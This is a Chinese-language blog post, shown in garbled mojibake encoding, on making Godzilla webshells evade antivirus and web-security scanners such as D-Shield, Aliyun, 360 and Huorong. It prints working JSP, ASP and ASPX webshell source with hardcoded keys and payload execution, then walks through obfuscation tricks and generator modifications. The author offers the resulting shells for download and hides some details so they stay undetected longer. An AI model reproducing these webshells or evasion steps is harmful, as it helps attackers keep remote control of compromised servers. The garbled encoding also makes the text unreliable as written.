![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNPoU1ehL13DWufdw1TonLbfrKicaqhVWYibNPLpqIpD8fDXOYU3s0uSuQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNfufus79aQTyqxexIsEE7wtxHwNCFN1GkkIryuaRP14ZQPgKhdPkGBQ/640?wx_fmt=png&from=appmsg "")  
  
  
ä¸‹é¢çš„è¯„è®ºä¸­ï¼Œä¹Ÿå†™äº†ï¼Œå•æ–‡ä»¶ä¸å¥½è¿‡é˜¿é‡Œäº‘äº†ã€‚éœ€è¦åˆ†ç¦»äº†ã€‚ç¬”è€…å¤ªèœäº†ï¼Œåé¢åœ¨ç ”ç©¶ã€‚  
  
æ¥ä¸‹æ¥çœ‹ä¸‹åŠéƒ¨åˆ†ï¼Œåœ¨çœ‹äº†å¤§é‡å“¥æ–¯æ‹‰å…æ€é©¬çš„æ•™ç¨‹åå‘ç°ï¼Œdç›¾æˆ‘ä¹Ÿæ²¡è¿‡å»ã€‚ä¸‹é¢å°±è®°å½•ä¸€ä¸‹ã€‚  
```
<%
Â  Â Â tryÂ {
Â  Â  Â  Â Â byte[] data = base64Decode(request.getParameter(pass));
Â  Â  Â  Â  data = x(data,Â false);

Â  Â  Â  Â Â ifÂ (session.getAttribute("payload") ==Â null) {
Â  Â  Â  Â  Â  Â  session.setAttribute("payload",Â newÂ X(this.getClass().getClassLoader()).Q(data));
Â  Â  Â  Â  }Â elseÂ {
Â  Â  Â  Â  Â  Â  request.setAttribute("parameters", data);
Â  Â  Â  Â  Â  Â  java.io.ByteArrayOutputStreamÂ arrOutÂ =Â newÂ java.io.ByteArrayOutputStream();
Â  Â  Â  Â  Â  Â Â ObjectÂ fÂ =Â ((Class) session.getAttribute("payload")).newInstance();
Â  Â  Â  Â  Â  Â  f.equals(arrOut);
Â  Â  Â  Â  Â  Â  f.equals(pageContext);

Â  Â  Â  Â  Â  Â  response.getWriter().write(md5.substring(0,Â 16));
Â  Â  Â  Â  Â  Â  f.toString();
Â  Â  Â  Â  Â  Â  response.getWriter().write(base64Encode(x(arrOut.toByteArray(),Â true)));
Â  Â  Â  Â  Â  Â  response.getWriter().write(md5.substring(16));
Â  Â  Â  Â  }
Â  Â  }Â catchÂ (Exception e) {}
%>
```  
  
è¿™æ˜¯ä¸‹åŠéƒ¨åˆ†ï¼Œä¸»è¦çš„æŸ¥æ€ç‚¹æ˜¯session.setAttribute("payload", new X(this.getClass().getClassLoader()).Q(data));  
  
å‡†ç¡®çš„æ¥è¯´æ˜¯getClassLoaderè¿™ä¸ªå­—ç¬¦ä¸²ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNC2YB0eANAGfOFsMJNhX4M9IPVFsJYHNxt2qFQCicP4m0nIobyQibwPfw/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™é‡Œç›´æ¥å°†è¿™ä¸ªå­—ç¬¦ä¸²åˆ æ‰ï¼Œå®Œå…¨æ²¡æœ‰é—®é¢˜ã€‚  
  
https://www.freebuf.com/sectool/386231.html  
  
åœ¨è¿™ç¯‡å¤§å¸ˆå‚…çš„æ–‡ç« ä¸­è¯´ï¼Œå°†this.getClass().getClassLoader() å¯æ›¿æ¢ä¸ºThread.currentThread().getContextClassLoader()  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN1tUV3aEBISoNdEVCpp76eaxOj0HkIqvhCiaQSlfo2evXgYIEqC1MibxQ/640?wx_fmt=png&from=appmsg "")  
  
  
ä½†æ˜¯ï¼Œæˆ‘ä»¬æƒŠå¥‡çš„å‘ç°ï¼ŒgetContextClassLoader() ä¹Ÿæ˜¯å­˜åœ¨ClassLoader æ‰€ä»¥è¿‡ä¸å»ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNaEAqRYGmBa11WuPjzRxbj4Ocib3zhLgNk7YmJSvGxXwMI0zuOtKmbJA/640?wx_fmt=png&from=appmsg "")  
  
  
ä¸ºäº†gptï¼Œå‘ç°ï¼Œæ— è®ºæ€ä¹ˆè·å–ï¼Œéƒ½éœ€è¦æœ‰ClassLoader()è¿™ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆå°±èµ°åˆ°äº†æ­»èƒ¡åŒã€‚  
  
è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯è‡ªå·±å†™äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆæä¸‹ï¼Œåé¢åœ¨ç ”ç©¶ï¼ˆå…¶å®å°±æ˜¯ç¬”è€…ä¸ä¼šï¼Œç­‰æˆ‘ç ”ç©¶ç ”ç©¶çš„ï¼‰ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNwQBicRyQB94icL4DPUJuadLR4F0Qa9yfeVOHgUrm7ibotISKicVvwQerEw/640?wx_fmt=png&from=appmsg "")  
  
  
é‚£ä¹ˆè¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯æ··æ·†äº†ï¼Œæ··æ·†å°±æ˜¯ç”¨unicodeç¼–ç ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNdqnkHKj3hP463CYTB9Z2UdB3ZBBWY4lYE7MkNibuicr3fCWC3yTicWXvg/640?wx_fmt=png&from=appmsg "")  
  
  
ä½†æ˜¯ä½ ä¼šå‘ç°ï¼Œæœ‰unicodeç¼–ç ã€‚ ç›´æ¥å°±æŠ¥ï¼Œä¹Ÿä¸ç®¡é‡Œé¢æ˜¯å•¥ã€‚æ‰€ä»¥æš‚æ—¶æˆ‘çš„è·¯ç»™å µæ­»äº†ã€‚  
  
æœ€åæˆ‘ä»¬å°±ç”¨unicodeç¼–ç å§ï¼ŒæŠ¥å°±æŠ¥å§ï¼Œæ€»æ¯”æŠ¥å¯ç–‘å¥½çœ‹ä¸€ç‚¹ã€‚  
  
è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬çš„æ¨¡æ¿å°±å†™å¥½äº†ã€‚  
  
è¯•è¯•ç«ç»’å’Œ360 ï¼Œ  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNshCeiaEO80d74ia999QJ9G0fEicD8Nx6wpLWzdCfRwOCV0u1m4xVWuEMQ/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™é‡Œä¼ å€¼çš„æ—¶å€™ï¼Œæ˜¯payloadå°±ä¸è¡Œï¼Œç«ç»’å’Œ360éƒ½æŠ¥ï¼Œ  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNwd1phMONDkeXrj9JO7w0quO2Zv84xOO53k2j6KNOzKOtvVCM1ugDtQ/640?wx_fmt=png&from=appmsg "")  
  
  
éšä¾¿å†™ä¸ªå­—ç¬¦ä¸²ï¼Œå³å¯äº†ã€‚åœ¨æ”¹æ”¹å˜é‡åï¼Œå°±ä¸æ¼”ç¤ºäº†ã€‚å¥½ï¼Œè¿™ä¸€æˆ‘ä»¬çš„æ¨¡æ¿å°±å½»åº•å®Œäº‹äº†ã€‚  
  
æ”¾åˆ°å“¥æ–¯æ‹‰é‡Œçš„binæ–‡ä»¶å°±è¡Œã€‚  
  
å½“ç„¶ï¼Œæˆ‘ä»¬çš„binæ–‡ä»¶éœ€è¦æ”¹ä¸€æ”¹ã€‚ç”±äºï¼Œå“¥æ–¯æ‹‰é»˜è®¤jspå½¢å¼çš„ç”Ÿæˆä»£ç æ˜¯ä¸¤æ®µï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦éƒ½æ”¹ä¸€ä¸‹  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNMVWuqah6HWnUyoBNgOCc22alicBHaUxoj7Z8rRibKAJiajgDC8PjPpSZg/640?wx_fmt=png&from=appmsg "")  
  
  
æŠŠè¿™äº›strå†™ä¸€ä¸‹ï¼Œåœ¨ä¸»generateä¸­ï¼Œå†™ä¸€äº›å­—ç¬¦ä¸²ï¼Œç„¶ååœ¨ç”Ÿæˆä»£ç æ—¶å€™è¿›è¡Œæ›¿æ¢å°±å¯ä»¥äº†ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNeiciboZAuuuamOPlxg26hHPxP4AN16Jap84zGUo4IicShbZ6SDnueThicg/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™ä¸ªæ´»çœ‹èµ·æ¥ç¡®å®ä¸æ˜¯å¾ˆéš¾ï¼Œä½†æ˜¯éœ€è¦å¾ˆç»†ï¼Œæ”¹äº†ä¸€å¤©ï¼Œé”™ä¸€ç‚¹åˆè¦é‡æ–°åˆ äº†åœ¨æ›¿æ¢ï¼Œå¿ƒæ€å¿«å´©äº†ã€‚  
  
è¿™é‡Œç»†å¿ƒçš„åŒå­¦ä¼šå‘ç°ï¼Œæˆ‘å°†åŸæœ¬é»˜è®¤çš„å“¥æ–¯æ‹‰ç”Ÿæˆçš„pass å’Œ keyè¿›è¡Œbase64äº†ã€‚  
  
å°±æ˜¯åœ¨è¿™ä¸ªåœ°æ–¹  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNDu5PTLeFkhIxVMUCdiaRicw3Hp0N6xBFgSH8ibFPMmlDecWe5PkUh119w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNYic9y2z3XRvicspLIZGz2uNjahdiaYOjHibJkggDXOx4icndnsmcPjO2qQw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNodgImbTFcUF3CGQ09PZHicmXe4S8T1u8BOFumuIXQCSbniaKVfWicsy2g/640?wx_fmt=png&from=appmsg "")  
  
  
åœ¨ç”Ÿæˆæœ¨é©¬ä¸­ï¼Œå°±æ‰¾ä¸åˆ°åŸæ¥çš„pass å’Œä¸€ä¸ª16ä½çš„å­—ç¬¦äº†ï¼Œå¢åŠ ä¸€ä¸¢ä¸¢è¿·æƒ‘æ€§å§  
  
åŸæœ¬çš„é©¬ä¸­ï¼Œæ˜¯æœ‰md5å‡½æ•°çš„ï¼Œä½†æ˜¯è¿™ä¸ªæ²¡æœ‰ï¼Œå› ä¸ºç”¨ä¸åˆ°ï¼Œå°±ç»™åˆ äº†ã€‚  
  
å½“ç„¶ï¼Œå…¶ä¸­ä¹ŸåŠ äº†ä¸€äº›å…¶ä»–çš„ä¸œè¥¿ã€‚è¿™é‡Œå°±ä¸ç»†è®²äº†ï¼Œé˜²æ­¢æš´æ¼ï¼Œèƒ½è®©å¤§å®¶å¤šç”¨ä¸€ä¼šã€‚  
  
å›åˆ°å…æ€ï¼Œæ˜¯çš„ï¼Œä¹Ÿè¿‡æ‰äº†dç›¾ï¼Œç¬”è€…ä¸Šé¢è¯´åˆ°çš„ gptå¸®æˆ‘ä»¬æ‰¾äº†ä¸€äº›å‡½æ•°ï¼Œä½†æ˜¯éƒ½æœ‰classcload è¿‡ä¸å»ï¼Œå…¶å®ä¸æ˜¯ï¼Œç»è¿‡æµ‹è¯•å‘ç°ï¼Œè¿™ä¸ªæ˜¯æœ‰å¯ä»¥ä»£æ›¿çš„ã€‚gptå¤ªå¼ºäº†ã€‚è¿™é‡Œå°±ä¸å†™æ”¹è¿‡å“ªé‡Œäº†ã€‚å¤§å®¶ä¸‹è½½äº†ç›´æ¥ç”¨å°±å¥½ã€‚ä¸‹ä¸ªç‰ˆæœ¬åœ¨æ­éœ²ï¼Œç›®å‰æˆ‘çœ‹ç½‘ä¸Šè¿˜æ²¡æœ‰è¿™ç§ç”¨æ³•ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNOMf3pcaMibzNuj8fEyqOJeNibF3xXprwe2NzvVqKAgG7hvyhWibDPhfiaA/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™æ ·å‘¢ï¼Œæˆ‘ä»¬å°±è¿‡æ‰äº†dç›¾ï¼Œå¸Œæœ›dç›¾çš„ä½œè€…ä¸è¦çœ‹åˆ°è¿™ä¸ªæ–‡ç« ï¼Œè¿™æ ·çš„è¯ï¼Œå°±èƒ½ä¸€ç›´ç”¨äº†ã€‚  
  
å¥½äº†ï¼Œè¿™æ ·å°±å¯ä»¥äº†ã€‚æš‚æ—¶å…ˆç”¨ç€ï¼Œçœ‹ä¸‹æ•ˆæœã€‚  
  
æ²¡æ¬¡ç”Ÿæˆçš„  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNjkxXicUKiaOR85Du0ibWl2hzb5fSicic2GGqJ3X3eUNiccAdt5ZOzfPhTDOw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNRkdvOzNZj6hbERu8CIu63ovSD8wTQOW36vrTMySYfGGbtOuyELkkyA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNmCKaJia5iayA4vo4BqLZhNdmhibtLxG1m8jUEUOKoCOGooqoFGlOI4odQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNBWibNVIibmFXD8LnLuAfy9Kdon0Q2ZlhOMhzDrMLKFq5n0V53sINeTVg/640?wx_fmt=png&from=appmsg "")  
  
  
okï¼Œæ²¡æœ‰é—®é¢˜ï¼Œè¿™æ ·jspçš„å…æ€å°±å®Œæˆäº†ã€‚å¤§å®¶åœ¨ä½¿ç”¨çš„æ—¶å€™ï¼Œå°½é‡åˆ«ç”¨pass å’Œkeyåšå¯†ç ï¼Œå¤ªæ˜æ˜¾äº†ã€‚ä¸‹é¢å’±ä»¬æ¥çœ‹aspçš„ã€‚  
##### asp  
  
å…ˆçœ‹ä¸€ä¸‹åŸç‰ˆçš„ğŸ  
```
<%
Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")

Function Base64Decode(ByVal vCode)
Â  Â  Dim oXML, oNode
Â  Â  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
Â  Â  Set oNode = oXML.CreateElement("base64")
Â  Â  oNode.dataType = "bin.base64"
Â  Â  oNode.text = vCode
Â  Â  Base64Decode = oNode.nodeTypedValue
Â  Â  Set oNode = Nothing
Â  Â  Set oXML = Nothing
End Function

Function decryption(content,isBin)
Â  Â  dim size,i,result,keySize
Â  Â  keySize = len(key)
Â  Â  Set BinaryStream = CreateObject("ADODB.Stream")
Â  Â  BinaryStream.CharSet = "iso-8859-1"
Â  Â  BinaryStream.Type = 2
Â  Â  BinaryStream.Open
Â  Â  if IsArray(content) then
Â  Â  Â  Â  size=UBound(content)+1
Â  Â  Â  Â  For i=1 To size
Â  Â  Â  Â  Â  Â  BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1)))
Â  Â  Â  Â  Next
Â  Â  end if
Â  Â  BinaryStream.Position = 0
Â  Â  if isBin then
Â  Â  Â  Â  BinaryStream.Type = 1
Â  Â  Â  Â  decryption=BinaryStream.Read()
Â  Â  else
Â  Â  Â  Â  decryption=BinaryStream.ReadText()
Â  Â  end if

End Function
Â  Â  key="3c6e0b8a9c15224a"
Â  Â  content=request.Form("pass")
Â  Â  if not IsEmpty(content) then

Â  Â  Â  Â  if Â IsEmpty(Session("payload")) then
Â  Â  Â  Â  Â  Â  content=decryption(Base64Decode(content),false)
Â  Â  Â  Â  Â  Â  Session("payload")=content
Â  Â  Â  Â  Â  Â  response.End
Â  Â  Â  Â  else
Â  Â  Â  Â  Â  Â  content=decryption(Base64Decode(content),true)
Â  Â  Â  Â  Â  Â  bypassDictionary.Add "payload",Session("payload")
Â  Â  Â  Â  Â  Â  Execute(bypassDictionary("payload"))
Â  Â  Â  Â  Â  Â  result=run(content)
Â  Â  Â  Â  Â  Â  response.Write("11cd6a")
Â  Â  Â  Â  Â  Â  if not IsEmpty(result) then
Â  Â  Â  Â  Â  Â  Â  Â  response.Write Base64Encode(decryption(result,true))
Â  Â  Â  Â  Â  Â  end if
Â  Â  Â  Â  Â  Â  response.Write("ac826a")
Â  Â  Â  Â  end if
Â  Â  end if
%>

```  
  
æˆ‘ä»¬ä¼šå‘ç°Execute(bypassDictionary("payload")) è¿™ä¸€å¥è‚¯å®šæ˜¯æ£€æŸ¥çš„é‡ç‚¹äº†ã€‚ç»è¿‡çœ‹æ–‡ç« ï¼Œä¸€å…±å°±ä¸‰ä¸ªæ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ï¼Œ  
  
Eval  
  
Execute  
  
ExecuteGlobal  
  
å¤§æ¦‚ç‡æ˜¯ä¸å¥½è¿‡äº†ã€‚aspå¯ä»¥ä½¿ç”¨chrï¼ˆ97ï¼‰è¿™ç§æ–¹å¼è¿›è¡Œæ··æ·†å…³é”®å­—ã€‚ä½†æ˜¯evalè¿™ç§ä¸å¯ä»¥ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNCaMHBW2NPnjYs1tsorNWKCdsYiawDhrQYAOPNwGLibDhibHeFicwvTQ9Fw/640?wx_fmt=png&from=appmsg "")  
  
  
ç±»ä¼¼è¿™ç§ã€‚å­—ç¬¦ä¸²å’Œchræ‹¼æ¥ã€‚  
  
å¤§æ¦‚è¿™æ ·  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNtUdalK3u30MKj2joXpcsEtH2poGiaQoEkE4iaqkb9s8scJAoazTibGdNg/640?wx_fmt=png&from=appmsg "")  
  
  
çœ‹ä¸€ä¸‹æŸ¥æ€æ•ˆæœï¼Œé¦–å…ˆçœ‹æœ€å¼ºçš„é˜¿é‡Œäº‘  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNDWQRpqkmWO8lB6aRlkhwicuqFtQftibyBfuTquygekhMGcJJICRDEXsw/640?wx_fmt=png&from=appmsg "")  
  
  
å¦‚æˆ‘ä»¬æ‰€æƒ³ï¼Œé˜¿é‡Œäº‘ç›´æ¥æ£€æµ‹EXECUTEï¼Œå­˜åœ¨å³è¢«banï¼Œé‚£è¿™æ ·çš„è¯ï¼Œæ²¡å•¥å¥½åŠæ³•äº†ï¼Œå’Œphpçš„evalä¸€æ ·äº†ã€‚å…ˆæç€ï¼Œåé¢ç¬”è€…åœ¨å­¦ä¹ å­¦ä¹ ã€‚  
  
å¾®æ­¥æ²¡é—®é¢˜  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNbHtFUEBn631U0gX6ep0WiaD1aD2eH3pwiaU6qAKicw3E0LfoGBoSc4W6Q/640?wx_fmt=png&from=appmsg "")  
  
  
æ²³é©¬ä¹Ÿæ²¡é—®é¢˜  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNqrG1cNCgcpbChhiasDatrgSxFdnuOP5SLSj8xFeQIghtEeVZGwpOvOA/640?wx_fmt=png&from=appmsg "")  
  
  
dç›¾  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNJN9Qq6KLNcg2w9RGhdEP5iaGn2zoyzQRe0hvHOdTBgeg0usI5dpXNmw/640?wx_fmt=png&from=appmsg "")  
  
  
360 ç«ç»’  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN9vVE1DajqOdlXDDdDoNM7Vk06INdkiabBKXOicFJD5dVncJZb3Fic0Cjw/640?wx_fmt=png&from=appmsg "")  
  
  
é‚£ä¹ˆä¹Ÿå°±æ˜¯é™¤äº†aliyun å…¶ä»–åº”è¯¥éƒ½æ²¡å•¥é—®é¢˜  
  
æˆ‘ä»¬è¿›è¡Œç®€å•ä¼˜åŒ–ä¸€ä¸‹ï¼Œå‡½æ•°å’Œå­—ç¬¦ä¸²å¤ç”¨ä¸€ä¸‹ï¼Œå°½é‡å°‘äº›ä¸€ç‚¹å­—ç¬¦ã€‚  
  
ç„¶åæ•´åˆ°åˆ°å“¥æ–¯æ‹‰é‡Œã€‚æ›¿æ¢ä¸€ä¸‹å˜é‡åã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNoIYKpfSoso4H8162vhOrfuDyFBeu6YChYUEIPInC20QuOYSAffH0kA/640?wx_fmt=png&from=appmsg "")  
  
  
æ¨¡æ¿ä¹Ÿä¿®æ”¹ä¸€ä¸‹  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN3cLs6MkdK80eIjzsibxz5646ibRrL3jaljhDufptpfEoYYJmxDVNrAEw/640?wx_fmt=png&from=appmsg "")  
  
  
ç„¶åæ‰“åŒ…è¯•ä¸€ä¸‹æ•ˆæœã€‚ç”Ÿæˆä¸‰ä¸ªå…æ€ğŸï¼Œéƒ½ä¸ä¸€æ ·ã€‚  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNZWBSs2QLMNT5jO8AR12ySWPo5ghBVLX1sVQ0uzR3yFacq2WevZ73Ew/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNNb4Xvd24ThyBZE13CjroBdyUCajIHBgs4MILcB84ekbtYib7t6ZDjVw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNpwPa6wfN4BGKS9RY8XzShjxiaJjXibicdzmCo6rLndRb9nYPb0PcdJNIg/640?wx_fmt=png&from=appmsg "")  
  
  
okï¼Œæ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚æ¥ä¸‹æ¥çœ‹aspxã€‚  
##### aspxå…æ€  
  
æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹aspxçš„CSHAP_AES_BASE64çš„ğŸ  
```
<%@ PAge LaNgUagE="C#"%>
<%try { string key = "3c6e0b8a9c15224a"; string pass = "pass"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", ""); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session["payload"] == null) { Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ; } else { System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); } } catch (System.Exception) { }
%>
```  
  
ä»£ç ç›¸å¯¹è¾ƒçŸ­ã€‚åº”è¯¥è°ƒç”¨base64æ¯”è¾ƒç®€å•ã€‚aspè°ƒç”¨base64ä»£ç ç›¸å¯¹è¾ƒå¤šï¼Œä»£ç ä¸€åº¦åˆ°äº†60è¡Œã€‚å¤§éƒ¨åˆ†éƒ½æ˜¯åœ¨åŠ è½½base64ã€‚ä¸»è¦å°±æ˜¯å°†è¿”å›çš„ç»“æœaesåè¿›è¡Œbase64ã€‚  
  
data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(changshangyi), System.Text.Encoding.Default.GetBytes(changshangyi)).TransformFinalBlock(data, 0, data.Length);  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN7S2RgExC0jdqz3iaibvVvOtSibel2hu2SCaLrpkRvcT1oqIgpd7tzibPVw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNOehvlicsy5LGFp676uYwTJUiarxrfueHOQiaEVXLJ0dwLatribIsjjqFpw/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™ä¸€å¥åº”è¯¥æ˜¯é‡è¦ï¼Œè¿˜æœ‰  
  
Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)));  
  
ç†è®ºä¸Šæ¥è¯´å…³äºdataå¤„ç†çš„éƒ½æ˜¯é‡è¦çš„ï¼Œdç›¾éƒ½æ ‡è®°äº†ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNCAZiafMPmr6798wsszZSAIdN4fdrmtckmZ0IKf20T8jibMV56y6VF9yw/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™ä¸ªåœ°æ–¹å®šä¹‰ä¸€ä¸ªå˜é‡ä¼ å‚ï¼Œæˆ–è€…  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNOTIVDghjQkdAeIQXVECruo8RUX7CwvCicdsDeMGIl0fVOE7M2iabwddA/640?wx_fmt=png&from=appmsg "")  
  
  
ç›´æ¥å°†aesæ‹†å¼€ä¹Ÿè¡Œã€‚  
  
ç°åœ¨æŠ¥å¯ç–‘ã€‚å†fuzzä¸€ä¸‹ï¼Œå“ªé‡Œå¯ç–‘ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNUzUE3fYhAa2fdhvBzDRCUwCiaXPNqnzXPWZunuxePdiaWFP1SgRPSFuw/640?wx_fmt=png&from=appmsg "")  
  
  
RijndaelManaged æ¢æˆAesManaged  
  
å¯ç–‘æ–‡ä»¶å‡ºç°åœ¨ä¸‹é¢è¿™ä¸€å¥è¯ä¸Š  
  
System.Reflection.MethodInfo loadMethod = assemblyType.GetMethod("Load", parameterTypes);  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNHjUz2DDCytbmU6jufrbBpWluVz8KrkPahWSYHkz7GqVvmZ7fsXBgoA/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™é‡Œè¿˜æ˜¯ç»™ä»–æ‹†å¼€å†™ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN3Gqqus1NcSA3FibYEibeR0FJ6DVEXqlRZUiaXx1IAUx0gKyhPkqBZic9gA/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™æ ·å°±å¯ä»¥äº†ã€‚è¿‡æ‰dç›¾ã€‚  
  
ä½†æ˜¯è¿˜æ˜¯æœ‰é—®é¢˜ï¼Œå°±æ˜¯æ˜¾ç¤ºè¯¥æ–‡ä»¶ä¸ºå•æ–‡ä»¶aspxï¼Œæœ‰ç‚¹ä¸‘é™‹ã€‚  
  
ç»è¿‡fuzzç¬”è€…å‘ç°ï¼Œè¿™ä¸ªå•æ–‡ä»¶  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNBT9qRHnvhYxea1Q6VD2TQMXQMtsVaNCehwQOjK3Kv4bpZEaFCMnNNQ/640?wx_fmt=png&from=appmsg "")  
  
  
åŒ¹é…çš„å°±æ˜¯å¼€å¤´çš„æ ‡è¯†ASPXçš„ä¸€ä¸ªå­—æ®µï¼Œå¯ä»¥æ˜¯ cã€jsã€Jscript ã€CSHARPç­‰  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN782zhcrIRbGnfHDYeSvFk2y2cg7IXwia83uqTpFwZopgzbztZJeCdNA/640?wx_fmt=png&from=appmsg "")  
  
  
